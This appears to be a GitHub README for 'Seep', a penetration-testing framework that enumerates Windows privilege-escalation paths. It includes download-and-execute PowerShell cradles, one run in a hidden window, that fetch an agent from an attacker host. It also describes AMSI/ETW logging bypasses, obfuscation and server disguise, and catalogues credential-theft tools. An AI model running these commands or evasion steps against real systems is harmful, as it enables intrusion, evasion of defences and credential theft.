<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Seep/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/Seep/main/docs/assets/logo-light.svg">
  <img alt="Seep" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/Seep/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Python](https://img.shields.io/badge/language-Python-green.svg)
![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**Windows privilege escalation enumeration framework with fileless agent, 16 checks, 97 tools, and MITRE ATT&CK mapping**

Water finds every crack -- so does Seep. Identifies misconfigurations, credential exposures, and escalation paths across 16 enumeration checks with 97 tools in 7 categories, MITRE ATT&CK-mapped recommendations, and single-file HTML reports -- all from a fileless agent.

> **Authorization Required**: This tool is designed exclusively for authorized security testing with explicit written permission. Unauthorized access to computer systems is illegal and may result in criminal prosecution.

[Quick Start](#quick-start) • [Agent Checks](#agent-checks) • [Tool Catalog](#tool-catalog) • [Architecture](#architecture) • [OPSEC](#opsec) • [Security](#security)

</div>

---

## Highlights

<table>
<tr>
<td width="50%">

**16 Enumeration Checks**
Token privileges, unquoted service paths, saved credentials, autoruns, scheduled tasks, registry secrets, DLL hijack candidates, web configs -- all producing structured JSON findings with severity ratings.

**97-Tool Catalog**
Organized across 7 categories (Enumeration, Credentials, TokenAbuse, AD, Tunneling, Impacket, Shells) with SHA256 integrity verification and self-hosted distribution via GitHub Releases.

**MITRE ATT&CK Recommendations**
Every finding maps to ATT&CK techniques with actionable exploitation guidance -- tool suggestions, example commands, and risk ratings sorted by severity.

**Fileless Execution**
Agent runs entirely in memory via IEX cradle. Results are AES-256-CBC encrypted, compressed, and uploaded over HTTP. AMSI/ETW/Script Block Logging bypassed automatically. Zero disk footprint.

</td>
<td width="50%">

**Single-File HTML Reports**
Dark-themed, self-contained HTML -- no CDN, no external requests. Executive summary, per-finding detail with evidence, remediation guidance, and recommended tools.

**Modular Agent Composer**
Cherry-pick checks with `--checks` / `--exclude`. Apply identifier randomization with `--obfuscate` -- function names, variables, HTTP headers, and check prefixes are all randomized.

**Concurrent Tool Downloads**
`seep catalog download --all` fetches tools from GitHub Releases with 4 parallel workers, SHA256 verification, and automatic symlink organization into category directories.

**Multi-Format Output**
HTML, Markdown, and JSON reports from a single result set. Pipe JSON to `jq` for scripted workflows. Reports include MITRE URLs, tool download links, and example commands.

</td>
</tr>
</table>

---

## Quick Start

### Prerequisites

<table>
<tr>
<th>Requirement</th>
<th>Version</th>
<th>Purpose</th>
</tr>
<tr>
<td>Python</td>
<td>3.9+</td>
<td>Attack box (Kali, etc.)</td>
</tr>
<tr>
<td>PowerShell</td>
<td>3.0+</td>
<td>Target (Windows 8+ / Server 2012+)</td>
</tr>
</table>

### Build

```bash
# From GitHub (recommended)
pipx install git+https://github.com/Real-Fruit-Snacks/Seep.git

# From a local clone
git clone https://github.com/Real-Fruit-Snacks/Seep.git
cd Seep && pipx install .

# For development
git clone https://github.com/Real-Fruit-Snacks/Seep.git
cd Seep && pip install -e ".[dev]"
```

### Verification

```bash
# Initialize workspace
seep init --workdir /tmp/op1

# Download tools (optional)
seep catalog download --all --workdir /tmp/op1

# Start server
seep serve --workdir /tmp/op1

# On target -- server prints ready-to-use cradles with auth tokens
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"

# Generate report from uploaded results
seep report /tmp/op1/results/results_*.json --format html --output report.html
```

> The default HTTP port is `80` (agent delivery + tool downloads) with upload on port `8000`. Override with `--port` and `--upload-port`. Use `--tls` for HTTPS.

---

## Usage

### Running the Agent

```bash
# Fileless -- agent downloads, auto-executes, results AES-encrypted and uploaded
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"

# Stealth variant -- no profile, hidden window
powershell -ep bypass -NoP -W Hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/agent.ps1?token=TOKEN')"

# Custom agent with specific checks only
seep compose --checks system_info,user_privileges,services --output agent.ps1
```

### Managing Tools

```bash
# List all tools
seep catalog list

# Filter by category
seep catalog list --category TokenAbuse

# Search
seep catalog search potato

# Download everything
seep catalog download --all --workdir /tmp/op1

# Verify integrity
seep catalog verify --workdir /tmp/op1
```

### Working with Results

```bash
# List uploaded results
seep results list --workdir /tmp/op1

# Show finding summary
seep results show /tmp/op1/results/results_20260224_WORKSTATION01.json

# Generate HTML report
seep report results.json --format html --output report.html

# Generate Markdown
seep report results.json --format md --output report.md
```

### Composing Agents

```bash
# Full agent (all 16 checks)
seep compose --output agent.ps1

# Minimal agent for quick triage
seep compose --checks system_info,user_privileges,quick_wins --output quick.ps1

# Obfuscated agent
seep compose --obfuscate --output obf_agent.ps1
```

---

## Command Reference

### Global Options

<table>
<tr>
<th>Flag</th>
<th>Description</th>
<th>Default</th>
</tr>
<tr><td><code>--workdir, -w</code></td><td>Workspace directory</td><td><code>~/.seep</code></td></tr>
</table>

### Commands

<table>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
<tr><td><code>init</code></td><td>Initialize workspace (config, directories)</td></tr>
<tr><td><code>serve</code></td><td>Start HTTP + upload server</td></tr>
<tr><td><code>catalog list</code></td><td>List tools (filter by <code>--category</code>, <code>--platform</code>)</td></tr>
<tr><td><code>catalog search &lt;query&gt;</code></td><td>Search tools by name, description, tags</td></tr>
<tr><td><code>catalog download</code></td><td>Download tools (<code>--category</code>, <code>--all</code>, <code>--verify</code>)</td></tr>
<tr><td><code>catalog verify</code></td><td>Verify SHA256 integrity of downloaded tools</td></tr>
<tr><td><code>catalog update</code></td><td>Check for newer tool releases on GitHub</td></tr>
<tr><td><code>compose</code></td><td>Build agent from check modules</td></tr>
<tr><td><code>report &lt;file&gt;</code></td><td>Generate report from results (<code>--format html|md|json</code>)</td></tr>
<tr><td><code>results list</code></td><td>List uploaded result files</td></tr>
<tr><td><code>results show &lt;file&gt;</code></td><td>Display finding summary from a result</td></tr>
</table>

---

## Agent Checks

<table>
<tr>
<th>#</th>
<th>Check ID</th>
<th>Description</th>
<th>OPSEC</th>
</tr>
<tr><td>1</td><td><code>system_info</code></td><td>User context, groups, privileges, local accounts, environment</td><td>Low</td></tr>
<tr><td>2</td><td><code>user_privileges</code></td><td>Token privileges -- flags SeImpersonate, SeAssignPrimaryToken</td><td>Low</td></tr>
<tr><td>3</td><td><code>network</code></td><td>Interfaces, open ports, active connections, routing, firewall</td><td>Low</td></tr>
<tr><td>4</td><td><code>patches</code></td><td>Installed KB patches, patch gap analysis</td><td>Low</td></tr>
<tr><td>5</td><td><code>quick_wins</code></td><td>PS history, saved credentials (cmdkey), autologon registry</td><td>Low</td></tr>
<tr><td>6</td><td><code>unattend_files</code></td><td>Unattend.xml / sysprep files with embedded passwords</td><td>Medium</td></tr>
<tr><td>7</td><td><code>web_configs</code></td><td>IIS web.config, .NET connection strings, credentials</td><td>Medium</td></tr>
<tr><td>8</td><td><code>services</code></td><td>All services + unquoted service path detection</td><td>Low</td></tr>
<tr><td>9</td><td><code>scheduled_tasks</code></td><td>Privileged scheduled tasks with writable scripts</td><td>Low</td></tr>
<tr><td>10</td><td><code>autoruns</code></td><td>Registry Run keys, startup folders, writable paths</td><td>Low</td></tr>
<tr><td>11</td><td><code>always_install</code></td><td>AlwaysInstallElevated MSI escalation check</td><td>Low</td></tr>
<tr><td>12</td><td><code>software</code></td><td>Installed software inventory</td><td>Low</td></tr>
<tr><td>13</td><td><code>processes</code></td><td>Running processes with owners and binary paths</td><td>Low</td></tr>
<tr><td>14</td><td><code>dll_hijack</code></td><td>Writable directories in system PATH</td><td>Medium</td></tr>
<tr><td>15</td><td><code>directory_tree</code></td><td>Common paths enumeration</td><td>Low</td></tr>
<tr><td>16</td><td><code>registry_secrets</code></td><td>Registry search for stored passwords, keys, sensitive data</td><td>Low</td></tr>
</table>

### Critical Alert Findings

<table>
<tr>
<th>Finding</th>
<th>Severity</th>
<th>Trigger</th>
</tr>
<tr><td>SeImpersonatePrivilege</td><td>CRITICAL</td><td>Token abuse path to SYSTEM via potato exploits</td></tr>
<tr><td>AutoLogon Credentials</td><td>CRITICAL</td><td>Plaintext password in Winlogon registry</td></tr>
<tr><td>AlwaysInstallElevated</td><td>CRITICAL</td><td>MSI escalation -- install as SYSTEM</td></tr>
<tr><td>Unquoted Service Path</td><td>HIGH</td><td>Binary planting in writable intermediate directory</td></tr>
<tr><td>Saved Credentials</td><td>HIGH</td><td>cmdkey entries usable with <code>runas /savecred</code></td></tr>
</table>

---

## Tool Catalog

97 tools organized across 7 categories, self-hosted via GitHub Releases:

<table>
<tr>
<th>Category</th>
<th>Count</th>
<th>Representative Tools</th>
</tr>
<tr><td><strong>Enumeration</strong></td><td>27</td><td>WinPEAS, SharpUp, Seatbelt, Watson, accesschk, pspy</td></tr>
<tr><td><strong>Credentials</strong></td><td>12</td><td>Mimikatz, LaZagne, SharpDPAPI, SharpChrome, Rubeus, Snaffler</td></tr>
<tr><td><strong>TokenAbuse</strong></td><td>10</td><td>PrintSpoofer, GodPotato, JuicyPotato, SweetPotato, RoguePotato</td></tr>
<tr><td><strong>AD</strong></td><td>16</td><td>SharpHound, Certify, Whisker, PowerView, Kerbrute, KrbRelayUp</td></tr>
<tr><td><strong>Tunneling</strong></td><td>9</td><td>Chisel, Ligolo-ng, socat, netcat</td></tr>
<tr><td><strong>Impacket</strong></td><td>18</td><td>secretsdump, GetUserSPNs, psexec, wmiexec, ntlmrelayx</td></tr>
<tr><td><strong>Shells</strong></td><td>5</td><td>Nishang, PHP shells, netcat variants</td></tr>
</table>

---

## Architecture

Seep follows a two-component architecture: a Python CLI on the attack box orchestrates everything, while a composed PowerShell agent runs on the target and reports back.

```
Seep/
├── server/
│   ├── cli.py                    # Click-style CLI (init, serve, catalog, compose, report, results)
│   ├── config.py                 # ServerConfig dataclass with YAML serialization
│   ├── agent/
│   │   ├── checks/               # 16 PowerShell check modules
│   │   │   ├── _base.ps1         # Shared helpers (New-Finding, Write-Status, Invoke-Evasion)
│   │   │   ├── system_info.ps1
│   │   │   ├── user_privileges.ps1
│   │   │   ├── network.ps1
│   │   │   └── ...
│   │   ├── templates/
│   │   │   └── agent_wrapper.ps1 # Invoke-Seep entry point
│   │   └── composer.py           # Assembles checks into single .ps1, identifier randomization
│   ├── catalog/
│   │   ├── tools.yaml            # 97 tool definitions (SHA256, categories, MITRE triggers)
│   │   ├── schemas.py            # ToolEntry, ToolCatalog, CategoryDef
│   │   ├── loader.py             # YAML loader with validation
│   │   └── manager.py            # Download, verify, symlinks, update check
│   ├── http/
│   │   ├── serve.py              # Unified HTTP handler (GET /agent, POST /upload, etc.)
│   │   └── tls.py                # Self-signed cert generation
│   ├── results/
│   │   └── parser.py             # JSON/ZIP upload parsing, schema validation
│   └── report/
│       ├── recommendations.py    # Finding->tool mapping with MITRE ATT&CK
│       └── generator.py          # HTML, Markdown, JSON report generation
│
├── tests/                         # 391 tests across 12 files
│
├── docs/                          # ── GitHub Pages ──
│   ├── index.html                # Project website
│   └── assets/
│       ├── logo-dark.svg         # Logo for dark theme
│       └── logo-light.svg        # Logo for light theme
│
└── .github/
    └── workflows/
        └── ci.yml                # CI pipeline
```

### Data Flow

```
seep serve                                    Target (Windows)
    |                                              |
    |  GET /agent.ps1?token=T ----------------->  IEX download
    |                                              |
    |                                     AMSI / ETW / SBL bypass
    |                                     Invoke-Seep runs (auto)
    |                                     16 checks -> JSON
    |                                              |
    |  POST /api/results  <-----------------  AES-256-CBC + GZip
    |   (auth via token)                           |
    v                                              |
results/results_*.json                             |
    |                                              |
seep report --> RecommendationEngine               |
    |               |                              |
    |          MITRE mapping                       |
    |          Tool suggestions                    |
    v                                              |
report.html (self-contained, dark theme)           |
```

---

## OPSEC

<table>
<tr>
<th>Layer</th>
<th>Protection</th>
<th>Detail</th>
</tr>
<tr><td><strong>Pre-download</strong></td><td>AMSI bypass in cradle</td><td>Format-string obfuscated patch runs before agent download</td></tr>
<tr><td><strong>Runtime evasion</strong></td><td>ETW + Script Block Logging</td><td><code>PSEtwLogProvider.etwEnabled</code> disabled, <code>cachedGroupPolicySettings</code> patched</td></tr>
<tr><td><strong>Language mode</strong></td><td>CLM detection</td><td>Agent detects Constrained Language Mode and warns before proceeding</td></tr>
<tr><td><strong>Network (server)</strong></td><td>Server header spoofing</td><td>Returns <code>Microsoft-IIS/10.0</code> -- no Python/BaseHTTPServer fingerprint</td></tr>
<tr><td><strong>Network (server)</strong></td><td>Benign index page</td><td>Unauthenticated visitors see "It works!" -- no C2 indicators</td></tr>
<tr><td><strong>Network (server)</strong></td><td>Auth-gated endpoints</td><td>All sensitive routes return 404 without valid token (not 401/403)</td></tr>
<tr><td><strong>Network (transport)</strong></td><td>AES-256-CBC encryption</td><td>Results encrypted with <code>SHA256(auth_token)</code> key, IV prepended, then GZip</td></tr>
<tr><td><strong>Agent identity</strong></td><td>Identifier randomization</td><td><code>--obfuscate</code> uses CSPRNG to randomize all function names, variables, headers</td></tr>
<tr><td><strong>Disk artifacts</strong></td><td>Fileless by default</td><td>IEX cradle, in-memory execution, no disk writes</td></tr>
</table>

---

## Tech Stack

<table>
<tr>
<th>Layer</th>
<th>Technology</th>
</tr>
<tr><td><strong>Language</strong></td><td>Python 3.9+ (server), PowerShell 3.0+ (agent)</td></tr>
<tr><td><strong>CLI</strong></td><td>argparse with subcommands</td></tr>
<tr><td><strong>HTTP</strong></td><td><code>http.server</code> stdlib (no Flask, no FastAPI)</td></tr>
<tr><td><strong>TLS</strong></td><td>OpenSSL via subprocess</td></tr>
<tr><td><strong>Catalog</strong></td><td>YAML (<code>pyyaml</code>) with SHA256 verification</td></tr>
<tr><td><strong>Reports</strong></td><td>Self-contained HTML, Markdown, JSON</td></tr>
<tr><td><strong>Testing</strong></td><td>pytest (391 tests)</td></tr>
<tr><td><strong>Encryption</strong></td><td>AES-256-CBC via <code>cryptography</code></td></tr>
</table>

---

## Features

<table>
<tr>
<th>Feature</th>
<th>Description</th>
</tr>
<tr><td><strong>16 enumeration checks</strong></td><td>Modular PowerShell scripts with metadata headers, composable</td></tr>
<tr><td><strong>97-tool catalog</strong></td><td>YAML-defined with SHA256, categories, upstream URLs, license tracking</td></tr>
<tr><td><strong>Severity system</strong></td><td>CRITICAL, HIGH, MEDIUM, LOW, INFO -- per finding and per recommendation</td></tr>
<tr><td><strong>MITRE ATT&CK mapping</strong></td><td>Every recommendation links to a technique (T1134.001, T1574.009, etc.)</td></tr>
<tr><td><strong>Fileless agent</strong></td><td>IEX cradle, in-memory GZip compression, HTTP upload -- zero disk footprint</td></tr>
<tr><td><strong>Agent composition</strong></td><td>Select/exclude checks, obfuscate strings, strip comments</td></tr>
<tr><td><strong>Concurrent downloads</strong></td><td>4-worker thread pool with progress output and hash verification</td></tr>
<tr><td><strong>Self-hosted tools</strong></td><td>GitHub Releases -- no upstream URL rot, version-pinned</td></tr>
<tr><td><strong>Self-signed TLS</strong></td><td>One-command HTTPS with auto-generated cert</td></tr>
<tr><td><strong>HTML reports</strong></td><td>Dark theme, self-contained, executive summary, recommendations</td></tr>
<tr><td><strong>Markdown reports</strong></td><td>Pipe-friendly, includes all findings and MITRE links</td></tr>
<tr><td><strong>JSON summary</strong></td><td>Machine-readable output for scripted workflows</td></tr>
<tr><td><strong>AMSI bypass</strong></td><td>Reflection-based AMSI patch in cradle and agent</td></tr>
<tr><td><strong>ETW bypass</strong></td><td>Disables <code>PSEtwLogProvider.etwEnabled</code> to prevent telemetry</td></tr>
<tr><td><strong>Identifier randomization</strong></td><td>CSPRNG-based randomization of function names, variables, headers</td></tr>
<tr><td><strong>Auth-gated endpoints</strong></td><td>All sensitive endpoints require token auth, return 404 on failure</td></tr>
</table>

---

## Platform Support

<table>
<tr>
<th>Capability</th>
<th>Linux (Attack Box)</th>
<th>Windows (Target)</th>
</tr>
<tr>
<td>CLI Server</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>Agent Execution</td>
<td>N/A</td>
<td>PowerShell 3.0+ (Windows 8+)</td>
</tr>
<tr>
<td>Tool Catalog</td>
<td>Full (download + serve)</td>
<td>N/A</td>
</tr>
<tr>
<td>TLS Server</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>Report Generation</td>
<td>Full</td>
<td>Full</td>
</tr>
<tr>
<td>AMSI/ETW Bypass</td>
<td>N/A</td>
<td>Full</td>
</tr>
<tr>
<td>ConPTY Detection</td>
<td>N/A</td>
<td>Windows 10 Build 17763+</td>
</tr>
</table>

---

## Security

### Vulnerability Reporting

**Report security issues via:**
- GitHub Security Advisories (preferred)
- Private disclosure to maintainers
- Responsible disclosure timeline (90 days)

**Do NOT:**
- Open public GitHub issues for vulnerabilities
- Disclose before coordination with maintainers
- Exploit vulnerabilities in unauthorized contexts

### Threat Model

**In scope:**
- Enumerating misconfigurations on authorized Windows targets
- Generating recommendations for authorized assessments
- Encrypted result transport between agent and server

**Out of scope:**
- Direct exploitation of Windows vulnerabilities
- Evading advanced EDR/XDR solutions
- Anti-forensics or evidence destruction

### What Seep Does NOT Do

Seep is a **Windows privesc enumeration framework**, not an exploitation tool:

- **Not an exploit framework** -- Enumerates misconfigurations, does not exploit them
- **Not a C2 framework** -- One-shot agent with result upload, no persistent implant
- **Not anti-forensics** -- Does not destroy evidence or tamper with logs
- **Not guaranteed evasion** -- AMSI/ETW bypasses may be detected by advanced solutions

---

## License

MIT License

Copyright &copy; 2026 Real-Fruit-Snacks

```
THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND.
THE AUTHORS ARE NOT LIABLE FOR ANY DAMAGES ARISING FROM USE.
USE AT YOUR OWN RISK AND ONLY WITH PROPER AUTHORIZATION.
```

---

## Resources

- **GitHub**: [github.com/Real-Fruit-Snacks/Seep](https://github.com/Real-Fruit-Snacks/Seep)
- **Documentation**: [real-fruit-snacks.github.io/Seep](https://real-fruit-snacks.github.io/Seep)
- **Issues**: [Report a Bug](https://github.com/Real-Fruit-Snacks/Seep/issues)
- **Security**: [SECURITY.md](SECURITY.md)
- **Contributing**: [CONTRIBUTING.md](CONTRIBUTING.md)
- **Changelog**: [CHANGELOG.md](CHANGELOG.md)

---

<div align="center">

**Part of the Real-Fruit-Snacks water-themed security toolkit**

[Aquifer](https://github.com/Real-Fruit-Snacks/Aquifer) • [Cascade](https://github.com/Real-Fruit-Snacks/Cascade) • [Conduit](https://github.com/Real-Fruit-Snacks/Conduit) • [Flux](https://github.com/Real-Fruit-Snacks/Flux) • [HydroShot](https://github.com/Real-Fruit-Snacks/HydroShot) • [Riptide](https://github.com/Real-Fruit-Snacks/Riptide) • [Runoff](https://github.com/Real-Fruit-Snacks/Runoff) • **Seep** • [Slipstream](https://github.com/Real-Fruit-Snacks/Slipstream) • [Tidepool](https://github.com/Real-Fruit-Snacks/Tidepool) • [Undertow](https://github.com/Real-Fruit-Snacks/Undertow) • [Whirlpool](https://github.com/Real-Fruit-Snacks/Whirlpool)

*Remember: With great power comes great responsibility.*

</div>
